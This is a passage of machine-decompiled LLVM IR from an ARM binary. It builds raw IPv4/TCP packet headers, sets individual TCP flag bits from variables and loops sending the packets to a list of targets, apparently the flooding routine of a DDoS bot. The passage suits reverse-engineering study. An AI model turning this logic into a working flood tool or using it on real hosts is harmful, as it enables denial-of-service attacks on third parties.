  store i32 %v1_a4ec, i32* %r0.global-to-local, align 4
  store i32 %v6_a210, i32* %r2.global-to-local, align 4
  %v5_a504 = call i32 @llvm.bswap.i32(i32 %v3_a4e8)
  store i32 %v5_a504, i32* %r3.global-to-local, align 4
  %v1_a508 = add i32 %v0_a4e8, 2
  %v2_a508 = inttoptr i32 %v1_a508 to i16*
  %v3_a508 = load i16, i16* %v2_a508, align 2
  %v4_a508 = zext i16 %v3_a508 to i32
  store i32 %v4_a508, i32* %r1.global-to-local, align 4
  store i32 %v1_a50c, i32* @r7, align 4
  %v0_a510 = load i32, i32* @lr, align 4
  %v1_a510 = trunc i32 %v0_a510 to i16
  %v2_a510 = load i32, i32* %ip.global-to-local, align 4
  %v3_a510 = add i32 %v2_a510, 14
  %v4_a510 = inttoptr i32 %v3_a510 to i16*
  store i16 %v1_a510, i16* %v4_a510, align 2
  %v0_a514 = load i32, i32* %r1.global-to-local, align 4
  %v1_a514 = trunc i32 %v0_a514 to i16
  %v2_a514 = load i32, i32* %ip.global-to-local, align 4
  %v3_a514 = add i32 %v2_a514, 12
  %v4_a514 = inttoptr i32 %v3_a514 to i16*
  store i16 %v1_a514, i16* %v4_a514, align 2
  %v0_a518 = load i32, i32* %r3.global-to-local, align 4
  %v1_a518 = load i32, i32* %ip.global-to-local, align 4
  %v2_a518 = add i32 %v1_a518, 8
  %v3_a518 = inttoptr i32 %v2_a518 to i32*
  store i32 %v0_a518, i32* %v3_a518, align 4
  %v0_a51c = load i32, i32* @r7, align 4
  store i32 %v0_a51c, i32* @r0, align 4
  %v0_a520 = call i32 @function_1183c()
  store i32 %v0_a520, i32* %r0.global-to-local, align 4
  store i32 %v2_a09c, i32* %r3.global-to-local, align 4
  %v2_a52c = load i32, i32* @r4, align 4
  %v5_a52c = mul i32 %v2_a52c, 4
  %v6_a52c = add i32 %v5_a52c, %v2_a09c
  %v7_a52c = inttoptr i32 %v6_a52c to i32*
  store i32 %v0_a520, i32* %v7_a52c, align 4
  %v3_a530 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a530, i32* %r2.global-to-local, align 4
  %v0_a534 = load i32, i32* %r3.global-to-local, align 4
  %v4_a534 = mul i32 %v3_a530, 4
  %v5_a534 = add i32 %v0_a534, %v4_a534
  %v6_a534 = inttoptr i32 %v5_a534 to i32*
  %v7_a534 = load i32, i32* %v6_a534, align 4
  store i32 %v7_a534, i32* @r4, align 4
  %v1_a538 = inttoptr i32 %v7_a534 to i8*
  %v2_a538 = load i8, i8* %v1_a538, align 1
  %tmp103 = urem i8 %v2_a538, 16
  %v1_a53c = zext i8 %tmp103 to i32
  %v1_a540 = or i32 %v1_a53c, 64
  store i32 %v1_a540, i32* %r3.global-to-local, align 4
  %v1_a544 = trunc i32 %v1_a540 to i8
  store i8 %v1_a544, i8* %v1_a538, align 1
  %v0_a548 = load i32, i32* @r4, align 4
  %v1_a548 = inttoptr i32 %v0_a548 to i8*
  %v2_a548 = load i8, i8* %v1_a548, align 1
  %v0_a54c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a54c, 256
  %v1_a554 = and i8 %v2_a548, -16
  %v1_a558 = or i8 %v1_a554, 5
  %v1_a55c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_a54c, 256
  %v4_a560 = urem i32 %tmp78, 256
  %v5_a560 = or i32 %v4_a560, %v1_a55c
  store i32 %v5_a560, i32* %r2.global-to-local, align 4
  %v0_a564 = load i32, i32* @fp, align 4
  %v1_a564 = urem i32 %v0_a564, 256
  store i32 %v1_a564, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %ip.global-to-local, align 4
  %v3_a56c = udiv i32 %v0_a564, 256
  store i32 %v3_a56c, i32* %r1.global-to-local, align 4
  store i8 %v1_a558, i8* %v1_a548, align 1
  %v0_a574 = load i32, i32* %r1.global-to-local, align 4
  %v1_a574 = load i32, i32* %r0.global-to-local, align 4
  %v4_a574 = mul i32 %v1_a574, 256
  %v5_a574 = or i32 %v4_a574, %v0_a574
  store i32 %v5_a574, i32* %r1.global-to-local, align 4
  store i32 %v6_a0b4, i32* %r0.global-to-local, align 4
  %v2_a57c = load i32, i32* @r4, align 4
  %v3_a57c = add i32 %v2_a57c, 1
  %v4_a57c = inttoptr i32 %v3_a57c to i8*
  store i8 %v5_a0d4, i8* %v4_a57c, align 1
  %v0_a580 = load i32, i32* %r1.global-to-local, align 4
  %v1_a580 = trunc i32 %v0_a580 to i16
  %v2_a580 = load i32, i32* @r4, align 4
  %v3_a580 = add i32 %v2_a580, 4
  %v4_a580 = inttoptr i32 %v3_a580 to i16*
  store i16 %v1_a580, i16* %v4_a580, align 2
  %v0_a584 = load i32, i32* %ip.global-to-local, align 4
  %v2_a584 = icmp eq i32 %v0_a584, 0
  store i1 %v2_a584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a110, i32* %r1.global-to-local, align 4
  %v0_a58c = load i32, i32* %r2.global-to-local, align 4
  %v1_a58c = trunc i32 %v0_a58c to i16
  %v2_a58c = load i32, i32* @r4, align 4
  %v3_a58c = add i32 %v2_a58c, 2
  %v4_a58c = inttoptr i32 %v3_a58c to i16*
  store i16 %v1_a58c, i16* %v4_a58c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a584, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4b0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4b0, %bb79
  %v0_a598 = load i32, i32* %r1.global-to-local, align 4
  %v1_a598 = trunc i32 %v0_a598 to i8
  %v2_a598 = load i32, i32* @r4, align 4
  %v3_a598 = add i32 %v2_a598, 8
  %v4_a598 = inttoptr i32 %v3_a598 to i8*
  store i8 %v1_a598, i8* %v4_a598, align 1
  %v0_a59c = load i32, i32* %r3.global-to-local, align 4
  %v1_a59c = trunc i32 %v0_a59c to i8
  %v2_a59c = load i32, i32* @r4, align 4
  %v3_a59c = add i32 %v2_a59c, 9
  %v4_a59c = inttoptr i32 %v3_a59c to i8*
  store i8 %v1_a59c, i8* %v4_a59c, align 1
  %v0_a5a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5a0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5a0 = trunc i32 %v1_a5a0 to i16
  %v3_a5a0 = load i32, i32* @r4, align 4
  %v4_a5a0 = add i32 %v3_a5a0, 6
  %v5_a5a0 = inttoptr i32 %v4_a5a0 to i16*
  store i16 %v2_a5a0, i16* %v5_a5a0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %r2.global-to-local, align 4
  %v2_a5a8 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_a5a8, i32* %r1.global-to-local, align 4
  %v1_a5ac = load i32, i32* @r4, align 4
  %v2_a5ac = add i32 %v1_a5ac, 12
  %v3_a5ac = inttoptr i32 %v2_a5ac to i32*
  store i32 %v2_a5a8, i32* %v3_a5ac, align 4
  %v3_a5b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5b0, i32* %r3.global-to-local, align 4
  store i32 %v2_a08c, i32* %ip.global-to-local, align 4
  %v4_a5b8 = mul i32 %v3_a5b0, 16
  %v5_a5b8 = add i32 %v4_a5b8, %v2_a08c
  %v6_a5b8 = inttoptr i32 %v5_a5b8 to i32*
  %v7_a5b8 = load i32, i32* %v6_a5b8, align 4
  store i32 %v7_a5b8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5b8, i32* %r3.global-to-local, align 4
  %v1_a5c4 = load i32, i32* @r4, align 4
  %v2_a5c4 = add i32 %v1_a5c4, 16
  %v3_a5c4 = inttoptr i32 %v2_a5c4 to i32*
  store i32 %v7_a5b8, i32* %v3_a5c4, align 4
  %v0_a5c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5c8 = add i32 %v0_a5c8, 12
  %v2_a5c8 = inttoptr i32 %v1_a5c8 to i16*
  %v3_a5c8 = load i16, i16* %v2_a5c8, align 2
  %v4_a5c8 = zext i16 %v3_a5c8 to i32
  store i32 %v4_a5c8, i32* %r0.global-to-local, align 4
  %v1_a5cc = add i32 %v0_a5c8, 8
  %v2_a5cc = inttoptr i32 %v1_a5cc to i32*
  %v3_a5cc = load i32, i32* %v2_a5cc, align 4
  store i32 %v3_a5cc, i32* %r1.global-to-local, align 4
  %v2_a5d0 = load i32, i32* @r4, align 4
  %v3_a5d0 = add i32 %v2_a5d0, 20
  %v4_a5d0 = inttoptr i32 %v3_a5d0 to i16*
  store i16 %v3_a5c8, i16* %v4_a5d0, align 2
  %v0_a5d4 = load i32, i32* @r4, align 4
  %v1_a5d4 = add i32 %v0_a5d4, 20
  store i32 %v1_a5d4, i32* @r8, align 4
  %v1_a5d8 = add i32 %v0_a5d4, 33
  %v2_a5d8 = inttoptr i32 %v1_a5d8 to i8*
  %v3_a5d8 = load i8, i8* %v2_a5d8, align 1
  %v4_a5d8 = zext i8 %v3_a5d8 to i32
  store i32 %v4_a5d8, i32* %r2.global-to-local, align 4
  %v0_a5dc = load i32, i32* %r1.global-to-local, align 4
  %v2_a5dc = add i32 %v0_a5d4, 24
  %v3_a5dc = inttoptr i32 %v2_a5dc to i32*
  store i32 %v0_a5dc, i32* %v3_a5dc, align 4
  %v0_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5e0 = or i32 %v0_a5e0, 1
  store i32 %v1_a5e0, i32* %r2.global-to-local, align 4
  %v0_a5e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5e4 = add i32 %v0_a5e4, 4
  %v2_a5e4 = inttoptr i32 %v1_a5e4 to i32*
  %v3_a5e4 = load i32, i32* %v2_a5e4, align 4
  store i32 %v3_a5e4, i32* %r1.global-to-local, align 4
  %v1_a5e8 = add i32 %v0_a5e4, 14
  %v2_a5e8 = inttoptr i32 %v1_a5e8 to i16*
  %v3_a5e8 = load i16, i16* %v2_a5e8, align 2
  %v4_a5e8 = zext i16 %v3_a5e8 to i32
  store i32 %v4_a5e8, i32* %r3.global-to-local, align 4
  %v1_a5ec = trunc i32 %v1_a5e0 to i8
  %v2_a5ec = load i32, i32* @r8, align 4
  %v3_a5ec = add i32 %v2_a5ec, 13
  %v4_a5ec = inttoptr i32 %v3_a5ec to i8*
  store i8 %v1_a5ec, i8* %v4_a5ec, align 1
  %v0_a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f0 = trunc i32 %v0_a5f0 to i16
  %v2_a5f0 = load i32, i32* @r8, align 4
  %v3_a5f0 = add i32 %v2_a5f0, 2
  %v4_a5f0 = inttoptr i32 %v3_a5f0 to i16*
  store i16 %v1_a5f0, i16* %v4_a5f0, align 2
  %v0_a5f4 = load i32, i32* @r8, align 4
  %v1_a5f4 = add i32 %v0_a5f4, 12
  %v2_a5f4 = inttoptr i32 %v1_a5f4 to i8*
  %v3_a5f4 = load i8, i8* %v2_a5f4, align 1
  %v4_a5f4 = zext i8 %v3_a5f4 to i32
  store i32 %v4_a5f4, i32* %r3.global-to-local, align 4
  %v1_a5f8 = add i32 %v0_a5f4, 13
  %v2_a5f8 = inttoptr i32 %v1_a5f8 to i8*
  %v3_a5f8 = load i8, i8* %v2_a5f8, align 1
  %v4_a5f8 = zext i8 %v3_a5f8 to i32
  %tmp104 = urem i8 %v3_a5f4, 16
  %v1_a5fc = zext i8 %tmp104 to i32
  %v1_a600 = or i32 %v1_a5fc, 128
  store i32 %v1_a600, i32* %r3.global-to-local, align 4
  %v1_a604 = or i32 %v4_a5f8, 16
  store i32 %v1_a604, i32* %r2.global-to-local, align 4
  %v0_a608 = load i32, i32* %r1.global-to-local, align 4
  %v2_a608 = add i32 %v0_a5f4, 8
  %v3_a608 = inttoptr i32 %v2_a608 to i32*
  store i32 %v0_a608, i32* %v3_a608, align 4
  %v0_a60c = load i32, i32* %r3.global-to-local, align 4
  %v1_a60c = trunc i32 %v0_a60c to i8
  %v2_a60c = load i32, i32* @r8, align 4
  %v3_a60c = add i32 %v2_a60c, 12
  %v4_a60c = inttoptr i32 %v3_a60c to i8*
  store i8 %v1_a60c, i8* %v4_a60c, align 1
  %v0_a610 = load i32, i32* %r2.global-to-local, align 4
  %v1_a610 = trunc i32 %v0_a610 to i8
  %v2_a610 = load i32, i32* @r8, align 4
  %v3_a610 = add i32 %v2_a610, 13
  %v4_a610 = inttoptr i32 %v3_a610 to i8*
  store i8 %v1_a610, i8* %v4_a610, align 1
  %v0_a614 = call i32 @function_e0b8()
  %v1_a614 = trunc i32 %v0_a614 to i16
  store i32 %v0_a614, i32* %r0.global-to-local, align 4
  store i32 %v1_a158, i32* %r1.global-to-local, align 4
  %v0_a61c = load i32, i32* @r8, align 4
  %v1_a61c = add i32 %v0_a61c, 13
  %v2_a61c = inttoptr i32 %v1_a61c to i8*
  %v3_a61c = load i8, i8* %v2_a61c, align 1
  %v4_a61c = zext i8 %v3_a61c to i32
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v1_a624 = and i32 %v4_a61c, 223
  %v5_a628 = or i32 %v1_a624, %v4_a628
  store i32 %v5_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v5_a628 to i8
  store i8 %v1_a62c, i8* %v2_a61c, align 1
  store i32 %v1_a178, i32* %ip.global-to-local, align 4
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 13
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v1_a638, i32* %r3.global-to-local, align 4
  %v1_a63c = and i32 %v4_a634, 239
  %v5_a640 = or i32 %v1_a63c, %v4_a640
  store i32 %v5_a640, i32* %r2.global-to-local, align 4
  %v1_a644 = trunc i32 %v5_a640 to i8
  store i8 %v1_a644, i8* %v2_a634, align 1
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a64c = load i32, i32* @r8, align 4
  %v1_a64c = add i32 %v0_a64c, 13
  %v2_a64c = inttoptr i32 %v1_a64c to i8*
  %v3_a64c = load i8, i8* %v2_a64c, align 1
  %v4_a64c = zext i8 %v3_a64c to i32
  store i32 %v1_a650, i32* %r2.global-to-local, align 4
  %v1_a654 = and i32 %v4_a64c, 247
  %v5_a658 = or i32 %v1_a654, %v4_a658
  store i32 %v5_a658, i32* %r3.global-to-local, align 4
  %v1_a65c = trunc i32 %v5_a658 to i8
  store i8 %v1_a65c, i8* %v2_a64c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a664 = load i32, i32* @r8, align 4
  %v1_a664 = add i32 %v0_a664, 13
  %v2_a664 = inttoptr i32 %v1_a664 to i8*
  %v3_a664 = load i8, i8* %v2_a664, align 1
  %v4_a664 = zext i8 %v3_a664 to i32
  store i32 %v1_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = and i32 %v4_a664, 251
  %v5_a670 = or i32 %v1_a66c, %v4_a670
  store i32 %v5_a670, i32* %r2.global-to-local, align 4
  %v1_a674 = trunc i32 %v5_a670 to i8
  store i8 %v1_a674, i8* %v2_a664, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a67c = load i32, i32* @r8, align 4
  %v1_a67c = add i32 %v0_a67c, 13
  %v2_a67c = inttoptr i32 %v1_a67c to i8*
  %v3_a67c = load i8, i8* %v2_a67c, align 1
  %v4_a67c = zext i8 %v3_a67c to i32
  store i32 %v1_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = and i32 %v4_a67c, 253
  %v4_a688 = or i32 %v1_a684, %v3_a688
  store i32 %v4_a688, i32* %r3.global-to-local, align 4
  %v1_a68c = trunc i32 %v4_a688 to i8
  store i8 %v1_a68c, i8* %v2_a67c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a694 = load i32, i32* @r8, align 4
  %v1_a694 = add i32 %v0_a694, 13
  %v2_a694 = inttoptr i32 %v1_a694 to i8*
  %v3_a694 = load i8, i8* %v2_a694, align 1
  %v4_a694 = zext i8 %v3_a694 to i32
  %v1_a69c = and i32 %v4_a694, 254
  store i32 %v1_a69c, i32* %r2.global-to-local, align 4
  %v2_a6a0 = or i32 %v1_a69c, %v1_a698
  store i32 %v2_a6a0, i32* %r3.global-to-local, align 4
  %v1_a6a4 = trunc i32 %v2_a6a0 to i8
  store i8 %v1_a6a4, i8* %v2_a694, align 1
  %v3_a6a8 = load i32, i32* @r8, align 4
  %v4_a6a8 = add i32 %v3_a6a8, 14
  %v5_a6a8 = inttoptr i32 %v4_a6a8 to i16*
  store i16 %v1_a614, i16* %v5_a6a8, align 2
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %v0_a6b0 = load i32, i32* @r4, align 4
  %v1_a6b0 = add i32 %v0_a6b0, 40
  store i32 %v1_a6b0, i32* %r0.global-to-local, align 4
  %v2_a6b4 = inttoptr i32 %v1_a6b0 to i16*
  %v3_a6b4 = call i32 @function_e24c(i16* %v2_a6b4, i32 %v6_a210)
  store i32 %v3_a6b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a408

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a27c
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a210, 40
  br label %dec_label_pc_a6cc

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a6bc
  %storemerge6.pre-phi = phi i32 [ %v1_a50c, %dec_label_pc_a41c ], [ %.pre, %dec_label_pc_a6bc ]
  %v0_a6e026 = phi i32 [ %v1_a410, %dec_label_pc_a41c ], [ 0, %dec_label_pc_a6bc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a210, 65536
  %storemerge = add i32 %v6_a210, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a6cc = add i32 %storemerge4, 1310720
  store i32 %v1_a6cc, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a6cc, 256
  %v3_a6d4 = and i32 %tmp83, 65280
  store i32 %v3_a6d4, i32* %r3.global-to-local, align 4
  %v4_a6d8 = udiv i32 %v1_a6cc, 16777216
  %v5_a6d8 = or i32 %v3_a6d4, %v4_a6d8
  store i32 %v5_a6d8, i32* @r8, align 4
  %v2_a804 = icmp eq i32 %v1_a230, 0
  br label %dec_label_pc_a6dc

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a7e8, %dec_label_pc_a6cc
  %v0_a6e0 = phi i32 [ %v0_a6e026, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a7e8 ], [ 0, %dec_label_pc_a6dc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a6e0 = icmp eq i32 %v0_a6e0, 0
  store i1 %v2_a6e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a6e0, label %dec_label_pc_a6dc, label %dec_label_pc_a6ec

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a7e8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a6f0

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a6ec
  %v1_a6f8 = phi i32 [ %v1_a7d8, %dec_label_pc_a718 ], [ 0, %dec_label_pc_a6ec ]
  store i32 %v2_a09c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a6f8 = mul i32 %v1_a6f8, 4
  %v5_a6f8 = add i32 %v4_a6f8, %v2_a09c
  %v6_a6f8 = inttoptr i32 %v5_a6f8 to i32*
  %v7_a6f8 = load i32, i32* %v6_a6f8, align 4
  store i32 %v7_a6f8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a700 = load i32, i32* @fp, align 4
  %v9_a700 = icmp eq i32 %v0_a700, 65535
  store i1 %v9_a700, i1* %cpsr_z.global-to-local, align 1
  %v1_a704 = add i32 %v7_a6f8, 20
  store i32 %v1_a704, i32* @r5, align 4
  br i1 %v9_a700, label %dec_label_pc_a7fc, label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a6f0
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i1 %v2_a804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a804, label %dec_label_pc_a718, label %dec_label_pc_a810

dec_label_pc_a718:                                ; preds = %dec_label_pc_a70c, %dec_label_pc_a7fc, %dec_label_pc_a810
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a71c = load i32, i32* @r4, align 4
  %v3_a71c = add i32 %v2_a71c, 10
  %v4_a71c = inttoptr i32 %v3_a71c to i16*
  store i16 0, i16* %v4_a71c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* @r0, align 4
  %v2_a728 = call i32 @function_c848(i32 %v0_a724, i32 20)
  %v3_a728 = trunc i32 %v2_a728 to i16
  store i32 %v2_a728, i32* %r0.global-to-local, align 4
  %v3_a72c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a08c, i32* %r2.global-to-local, align 4
  %v3_a734 = mul i32 %v3_a72c, 16
  %v2_a738 = add i32 %v3_a734, %v2_a08c
  store i32 %v2_a738, i32* %r1.global-to-local, align 4
  %v1_a73c = add i32 %v2_a738, 4
  %v2_a73c = inttoptr i32 %v1_a73c to i32*
  %v3_a73c = load i32, i32* %v2_a73c, align 4
  %v3_a740 = mul i32 %v3_a73c, 65536
  store i32 %v3_a740, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a73c, 256
  %v1_a748 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a73c, 256
  %v4_a74c = urem i32 %tmp86, 256
  %v5_a74c = or i32 %v4_a74c, %v1_a748
  store i32 %v5_a74c, i32* %r3.global-to-local, align 4
  %v1_a750 = add i32 %v3_a73c, 1
  store i32 %v1_a750, i32* %r2.global-to-local, align 4
  store i32 %v1_a750, i32* %v2_a73c, align 4
  %v0_a758 = load i32, i32* %r3.global-to-local, align 4
  %v1_a758 = load i32, i32* @r5, align 4
  %v2_a758 = add i32 %v1_a758, 4
  %v3_a758 = inttoptr i32 %v2_a758 to i32*
  store i32 %v0_a758, i32* %v3_a758, align 4
  %v0_a75c = load i32, i32* %r1.global-to-local, align 4
  %v1_a75c = add i32 %v0_a75c, 8
  %v2_a75c = inttoptr i32 %v1_a75c to i32*
  %v3_a75c = load i32, i32* %v2_a75c, align 4
  %tmp87 = mul i32 %v3_a75c, 256
  %v1_a768 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_a75c, 256
  %v4_a76c = urem i32 %tmp88, 256
  %v5_a76c = or i32 %v4_a76c, %v1_a768
  %v1_a770 = load i32, i32* @r5, align 4
  %v2_a770 = add i32 %v1_a770, 8
  %v3_a770 = inttoptr i32 %v2_a770 to i32*
  store i32 %v5_a76c, i32* %v3_a770, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a778 = load i32, i32* @r4, align 4
  %v4_a778 = add i32 %v3_a778, 10
  %v5_a778 = inttoptr i32 %v4_a778 to i16*
  store i16 %v3_a728, i16* %v5_a778, align 2
  %v0_a77c = load i32, i32* @r5, align 4
  store i32 %v0_a77c, i32* @r1, align 4
  %v0_a780 = load i32, i32* %r3.global-to-local, align 4
  %v1_a780 = trunc i32 %v0_a780 to i16
  %v3_a780 = add i32 %v0_a77c, 16
  %v4_a780 = inttoptr i32 %v3_a780 to i16*
  store i16 %v1_a780, i16* %v4_a780, align 2
  %v0_a784 = load i32, i32* @r8, align 4
  store i32 %v0_a784, i32* %r2.global-to-local, align 4
  %v0_a788 = load i32, i32* @sl, align 4
  store i32 %v0_a788, i32* %r3.global-to-local, align 4
  %v0_a78c = load i32, i32* @r4, align 4
  store i32 %v0_a78c, i32* %r0.global-to-local, align 4
  %v4_a790 = call i32 @function_c898(i32 %v0_a78c, i32 %v0_a77c, i32 %v0_a784, i32 %v0_a788)
  %v5_a790 = trunc i32 %v4_a790 to i16
  store i32 %v4_a790, i32* %r0.global-to-local, align 4
  %v3_a794 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a794, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a79c = mul i32 %v3_a794, 32
  store i32 %v3_a79c, i32* %lr.global-to-local, align 4
  %v3_a7a0 = load i32, i32* @r5, align 4
  %v4_a7a0 = add i32 %v3_a7a0, 16
  %v5_a7a0 = inttoptr i32 %v4_a7a0 to i16*
  store i16 %v5_a790, i16* %v5_a7a0, align 2
  %v0_a7a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7a4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7a4, -8
  %v5_a7a4 = add i32 %v0_a7a4, %tmp105
  store i32 %v5_a7a4, i32* %lr.global-to-local, align 4
  %v0_a7a8 = load i32, i32* @r5, align 4
  %v1_a7a8 = add i32 %v0_a7a8, 2
  %v2_a7a8 = inttoptr i32 %v1_a7a8 to i16*
  %v3_a7a8 = load i16, i16* %v2_a7a8, align 2
  %v1_a7ac = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ac = add i32 %v1_a7ac, %v5_a7a4
  store i32 %v2_a7ac, i32* @lr, align 4
  %v3_a7b0 = add i32 %v2_a7ac, 2
  %v4_a7b0 = inttoptr i32 %v3_a7b0 to i16*
  store i16 %v3_a7a8, i16* %v4_a7b0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7bc = load i32, i32* @r4, align 4
  store i32 %v0_a7bc, i32* %r1.global-to-local, align 4
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v0_a7c4 = load i32, i32* @r7, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @lr, align 4
  %v6_a7d0 = call i32 @function_11570(i32 %v0_a7c0, i32 %v0_a7bc, i32 %v0_a7c4, i32 16384, i32 %v0_a7c8, i32 16)
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  %v1_a7d8 = add i32 %v3_a7d4, 1
  store i32 %v1_a7d8, i32* %r0.global-to-local, align 4
  %v0_a7dc = load i32, i32* @r6, align 4
  %v9_a7dc = icmp eq i32 %v0_a7dc, %v1_a7d8
  store i1 %v9_a7dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a7d8, i32* %stack_var_-44, align 4
  %v8_a7e4 = icmp sgt i32 %v0_a7dc, %v1_a7d8
  br i1 %v8_a7e4, label %dec_label_pc_a6f0, label %dec_label_pc_a7e8

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_a718
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a7ec = icmp eq i32 %v0_a7dc, 0
  store i1 %v2_a7ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a7ec, label %dec_label_pc_a6dc, label %dec_label_pc_a6ec

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a6f0
  %v0_a7fc = call i32 @function_e0b8()
  %v1_a7fc = trunc i32 %v0_a7fc to i16
  store i32 %v0_a7fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i1 %v2_a804, i1* %cpsr_z.global-to-local, align 1
  %v3_a808 = load i32, i32* @r4, align 4
  %v4_a808 = add i32 %v3_a808, 4
  %v5_a808 = inttoptr i32 %v4_a808 to i16*
  store i16 %v1_a7fc, i16* %v5_a808, align 2
  br i1 %v2_a804, label %dec_label_pc_a718, label %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge

dec_label_pc_a7fc.dec_label_pc_a810_crit_edge:    ; preds = %dec_label_pc_a7fc
  %v0_a810.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a810

dec_label_pc_a810:                                ; preds = %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge, %dec_label_pc_a70c
  %v0_a810 = phi i32 [ %v0_a810.pre, %dec_label_pc_a7fc.dec_label_pc_a810_crit_edge ], [ %v7_a6f8, %dec_label_pc_a70c ]
  %v1_a810 = add i32 %v0_a810, 40
  store i32 %v1_a810, i32* %r0.global-to-local, align 4
  store i32 %v6_a210, i32* %r1.global-to-local, align 4
  %v2_a818 = inttoptr i32 %v1_a810 to i16*
  %v3_a818 = call i32 @function_e24c(i16* %v2_a818, i32 %v6_a210)
  store i32 %v3_a818, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a718

; uselistorder directives
  uselistorder i32 %v0_a7fc, { 1, 0 }
  uselistorder i32 %v1_a7d8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7a4, { 1, 0 }
  uselistorder i32 %v4_a790, { 1, 0 }
  uselistorder i32 %v3_a75c, { 1, 0 }
  uselistorder i32 %v3_a73c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a728, { 1, 0 }
  uselistorder i1 %v2_a804, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a614, { 1, 0 }
  uselistorder i32 %v0_a54c, { 1, 0 }
  uselistorder i32 %v5_a4e0, { 1, 0 }
  uselistorder i32 %v0_a4a0, { 1, 0 }
  uselistorder i32 %v0_a45c, { 1, 2, 0, 3 }
